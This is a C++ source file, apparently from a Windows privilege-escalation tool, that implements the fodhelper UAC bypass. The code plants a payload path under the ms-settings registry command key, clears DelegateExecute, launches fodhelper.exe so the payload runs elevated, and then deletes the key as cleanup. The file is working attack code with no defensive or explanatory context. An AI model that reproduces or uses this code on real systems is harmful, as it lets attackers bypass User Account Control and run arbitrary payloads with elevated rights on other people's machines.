#include "methods.h"

#include <Windows.h>
#include <iostream>

void Methods::ExecuteMethod(int number, std::string filePath) {
	switch (number)
	{
	case 1:
		Method1(filePath);
		break;
	default:
		std::cerr << "invalid method passed" << std::endl;
		break;
	}
}

void Methods::Method1(std::string filePath) {
    LPCWSTR subKey = L"Software\\Classes\\ms-settings\\shell\\open\\command";
    HKEY hKey;

    std::cout << "[METHOD - 1] Attempting to open or create registry key: " << std::string(subKey, subKey + wcslen(subKey)) << std::endl;

    if (RegCreateKeyExW(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        std::cout << "[ERROR] Failed to create or open registry key." << std::endl;
        return;
    }
    std::cout << "[METHOD - 1] Registry key opened/created successfully." << std::endl;

    std::wstring wideFilePath(filePath.begin(), filePath.end());
    LPCWSTR payloadPath = wideFilePath.c_str();
    std::cout << "[METHOD - 1] Payload path: " << std::string(payloadPath, payloadPath + wcslen(payloadPath)) << std::endl;

    if (RegSetValueExW(hKey, NULL, 0, REG_SZ,
        (const BYTE*)payloadPath,
        (wcslen(payloadPath) + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
        std::cout << "[METHOD - 1] Failed to set default registry value." << std::endl;
        RegCloseKey(hKey);
        return;
    }
    std::cout << "[METHOD - 1] Default registry value set to payload path." << std::endl;

    if (RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        (const BYTE*)L"", sizeof(wchar_t)) != ERROR_SUCCESS) {
        std::cout << "[METHOD - 1] Failed to set DelegateExecute registry value." << std::endl;
        RegCloseKey(hKey);
        return;
    }
    std::cout << "[METHOD - 1] DelegateExecute value set successfully." << std::endl;

    RegCloseKey(hKey);
    std::cout << "[METHOD - 1] Registry key closed." << std::endl;

    Sleep(1000);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;

    wchar_t exePath[] = L"fodhelper.exe";
    std::cout << "[METHOD - 1] Attempting to launch: " << std::string(exePath, exePath + wcslen(exePath)) << std::endl;

    if (CreateProcessW(nullptr, exePath, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cout << "[METHOD - 1] Process launched successfully." << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::cout << "[METHOD - 1] Failed to launch process: " << std::string(exePath, exePath + wcslen(exePath)) << std::endl;
    }

    Sleep(1000);

    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS) {
        std::cout << "[METHOD - 1] Registry key reopened for cleanup." << std::endl;
        RegDeleteValueW(hKey, L"DelegateExecute");
        RegDeleteKeyW(HKEY_CURRENT_USER, subKey);
        RegCloseKey(hKey);
        std::cout << "[METHOD - 1] Cleanup complete: DelegateExecute and key deleted." << std::endl;
    }
    else {
        std::cout << "[METHOD - 1] Failed to reopen registry key for cleanup." << std::endl;
    }
}